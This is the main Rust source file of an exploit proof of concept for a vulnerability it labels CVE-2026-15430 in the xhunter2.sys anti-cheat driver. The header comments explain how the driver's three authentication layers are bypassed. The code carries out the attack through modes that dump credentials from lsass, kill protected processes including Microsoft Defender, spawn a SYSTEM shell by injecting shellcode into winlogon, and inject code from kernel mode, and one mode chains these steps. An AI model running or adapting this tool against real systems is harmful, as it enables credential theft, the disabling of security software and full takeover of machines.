//! AxHunter_v2 — exploit PoC for `xhunter2.sys` v2026.6.1.192 (Wellbia XIGNCODE3).
//!
//! CVE-2026-15430. Bypasses the three cryptographic authentication layers
//! Wellbia added in the rewrite of `xhunter1.sys`:
//!
//!   Layer 1: WBMF RSA-signed PE fingerprint at IRP_MJ_CREATE (sub_140002C80)
//!            → map the real wbmf_module.dll and start each thread on a JMP
//!              trampoline inside the mapped region.
//!   Layer 2: WBCC per-request certificate chain (sub_1400027F4 / sub_1400029B8)
//!            → count=0 in the WBCC blob makes the chain iterator return success
//!              immediately.
//!   Layer 3: PID flag gate (sub_140009688) requiring (flags & 0x80000008) ==
//!            0x80000008 → cmd 777 + cmd 779 + cmd 775 escalation to 0xC0000008.
//!
//! Four modes plus `all`:
//!
//!   * `dump`   — credential extraction from `lsass.exe` via cmd 787 memory read.
//!   * `kill`   — cmd 800 handle stomp on every entry in the target's handle
//!                table (cmd 791 snapshot). Works against PPL targets such as
//!                `MsMpEng.exe`.
//!   * `lpe`    — inject `WinExec("cmd.exe", SW_SHOW)` shellcode into a SYSTEM
//!                source process (default: `winlogon.exe`) via `VirtualAllocEx`
//!                / `WriteProcessMemory` / `CreateRemoteThread` on the cmd 785
//!                handle. Child cmd.exe inherits the source's primary SYSTEM
//!                token + Session 1 → interactive SYSTEM shell.
//!   * `inject` — kernel-mode code injection via cmd 820. The driver does
//!                `ObOpenObjectByPointer(KernelMode)` + `ZwAllocateVirtualMemory(RWX)`
//!                + `RtlCreateUserThread` — all kernel-side. Works against PPL
//!                targets that block usermode VirtualAllocEx/WriteProcessMemory.
//!                Requires `-t` target (PID or image name).
//!
//! Build:  cargo build --release
//! Run:    .\target\release\AxHunter_v2.exe -m dump
//!         .\target\release\AxHunter_v2.exe -m kill -t MsMpEng.exe
//!         .\target\release\AxHunter_v2.exe -m lpe
//!         .\target\release\AxHunter_v2.exe -m inject -t winlogon.exe
//!         .\target\release\AxHunter_v2.exe -m all

#![allow(non_snake_case, non_camel_case_types, static_mut_refs)]

mod driver;
mod proto;
mod wbmf;
mod session;
mod kill;
mod dump;
mod lpe;
mod inject;

use std::ffi::c_void;
use std::process::ExitCode;

use clap::{Parser, ValueEnum};
use windows::Win32::System::{
    Memory::{VirtualFree, MEM_RELEASE},
    Threading::GetCurrentProcessId,
};

use session::find_pid;
use wbmf::{open_device, DEFAULT_DEVICE, normalise_device};
use kill::run_kill;
use dump::run_dump;
use lpe::run_lpe;
use inject::run_inject;
use proto::Handle;

#[derive(Parser, Debug)]
#[command(
    name = "AxHunter_v2",
    version,
    about = "xhunter2.sys v2026.6.1.192 (Wellbia XIGNCODE3) — three-layer-auth-bypass PoC (CVE-2026-15430)",
    long_about = None,
)]
struct Cli {
    /// Mode to run.
    #[arg(short = 'm', long = "mode", value_enum)]
    mode: Mode,

    /// Target PID (e.g. 1234) or image name (e.g. msmpeng.exe).
    /// Required for `-m kill` and `-m inject`. Optional override for `-m dump`
    /// (defaults to `lsass.exe`) and `-m lpe` (defaults to `winlogon.exe`).
    #[arg(short = 't', long = "target", required_if_eq_any([("mode", "kill"), ("mode", "inject")]))]
    target: Option<String>,

    /// Driver device path. Accepts a bare service name ("xhunter2")
    /// or a full NT path ("\Device\xhunter2").
    #[arg(short = 'd', long = "device", default_value = DEFAULT_DEVICE)]
    device: String,

    /// Raw shellcode `.bin` file for `-m inject`. If omitted, uses the
    /// built-in WinExec("cmd.exe") shellcode.
    #[arg(short = 'p', long = "payload")]
    payload: Option<String>,
}

#[derive(ValueEnum, Clone, Debug, PartialEq, Eq)]
#[clap(rename_all = "lowercase")]
enum Mode {
    /// Credential extraction from lsass.exe (NT hashes + WDigest).
    Dump,
    /// Handle-stomp PPL kill via cmd 800.
    Kill,
    /// Local privilege escalation — inject into winlogon.exe, spawn cmd.exe as SYSTEM.
    Lpe,
    /// Kernel-mode code injection via cmd 820 — driver does alloc+write+execute.
    /// Works against PPL targets. Requires `-t` target.
    Inject,
    /// Run dump, then kill MsMpEng.exe, then lpe. Each step continues on failure.
    All,
}

fn banner() {
    println!();
    println!("  AxHunter_v2 — xhunter2.sys v2026.6.1.192 (Wellbia XIGNCODE3)");
    println!("  CVE-2026-15430  |  WBMF + WBCC + PID gate bypass → cmd 785/787/800");
    println!();
}

/// Resolve `--target` string (or fallback default) to a PID.
/// Numeric string → PID; anything else → image-name lookup via `find_pid`.
fn resolve_target(target: Option<&str>, default_name: &str) -> Result<(u32, String), String> {
    let name = target.unwrap_or(default_name);
    if let Ok(pid) = name.parse::<u32>() {
        if pid != 0 {
            return Ok((pid, format!("pid {pid}")));
        }
    }
    let pid = find_pid(name)?;
    Ok((pid, format!("{name} (pid {pid})")))
}

/// Run one mode. On success returns 0; on failure returns non-zero (either the
/// NTSTATUS from the driver or -1 for other errors).
fn run_mode(
    mode: &Mode,
    target: Option<&str>,
    device: &str,
    our_pid: u32,
    payload: Option<&str>,
) -> i32 {
    let (dev, pe_ptr, soi) = match open_device(device) {
        Ok(x) => x,
        Err(e) => { eprintln!("[-] {e}"); return -1; }
    };

    let status = match mode {
        Mode::Kill => {
            let (target_pid, label) = match resolve_target(target, "") {
                Ok(x) => x,
                Err(e) => { cleanup(dev, pe_ptr); eprintln!("[-] {e}"); return -1; }
            };
            println!("[+] target ......... {label}");
            let st = run_kill(dev, pe_ptr, soi, our_pid, target_pid);
            if st == 0 { println!("\n[+] target terminated"); }
            else { eprintln!("\n[-] kill failed  NTSTATUS {:#010x}", st as u32); }
            st
        }
        Mode::Dump => {
            let (target_pid, label) = match resolve_target(target, "lsass.exe") {
                Ok(x) => x,
                Err(e) => { cleanup(dev, pe_ptr); eprintln!("[-] {e}"); return -1; }
            };
            println!("[+] target ......... {label}");
            let st = run_dump(dev, pe_ptr, soi, our_pid, target_pid);
            if st != 0 { eprintln!("\n[-] dump failed  NTSTATUS {:#010x}", st as u32); }
            st
        }
        Mode::Lpe => {
            let (target_pid, label) = match resolve_target(target, "winlogon.exe") {
                Ok(x) => x,
                Err(e) => { cleanup(dev, pe_ptr); eprintln!("[-] {e}"); return -1; }
            };
            println!("[+] source ......... {label}");
            let st = run_lpe(dev, pe_ptr, soi, our_pid, target_pid);
            if st != 0 { eprintln!("\n[-] lpe failed"); }
            st
        }
        Mode::Inject => {
            let (target_pid, label) = match resolve_target(target, "") {
                Ok(x) => x,
                Err(e) => { cleanup(dev, pe_ptr); eprintln!("[-] {e}"); return -1; }
            };
            println!("[+] target ......... {label}");
            let st = run_inject(dev, pe_ptr, soi, our_pid, target_pid, payload);
            if st == 0 { println!("\n[+] injection succeeded"); }
            else { eprintln!("\n[-] inject failed  NTSTATUS {:#010x}", st as u32); }
            st
        }
        Mode::All => unreachable!("Mode::All handled by run_all"),
    };

    cleanup(dev, pe_ptr);
    status
}

/// Run dump → kill MsMpEng.exe → lpe in sequence. Failures in individual
/// modes are printed but don't abort the run — each capability is independent.
fn run_all(device: &str, our_pid: u32) -> i32 {
    println!("[*] ===== mode: dump =====");
    let _ = run_mode(&Mode::Dump, None, device, our_pid, None);

    println!("\n[*] ===== mode: kill MsMpEng.exe =====");
    let _ = run_mode(&Mode::Kill, Some("MsMpEng.exe"), device, our_pid, None);

    println!("\n[*] ===== mode: lpe =====");
    let _ = run_mode(&Mode::Lpe, None, device, our_pid, None);

    0
}

fn cleanup(dev: Handle, pe_ptr: *mut u8) {
    unsafe {
        extern "system" { fn NtClose(h: Handle) -> i32; }
        NtClose(dev);
        VirtualFree(pe_ptr as *mut c_void, 0, MEM_RELEASE).ok();
    }
}

fn main() -> ExitCode {
    banner();

    let cli = Cli::parse();
    let device = normalise_device(&cli.device);
    let our_pid = unsafe { GetCurrentProcessId() };

    println!("[+] our pid ........ {our_pid}");
    println!("[+] mode ........... {:?}", cli.mode);
    println!("[+] device ......... {device}");
    println!();

    let status = match cli.mode {
        Mode::All => run_all(&device, our_pid),
        _ => run_mode(&cli.mode, cli.target.as_deref(), &device, our_pid, cli.payload.as_deref()),
    };

    if status == 0 { ExitCode::SUCCESS } else { ExitCode::FAILURE }
}
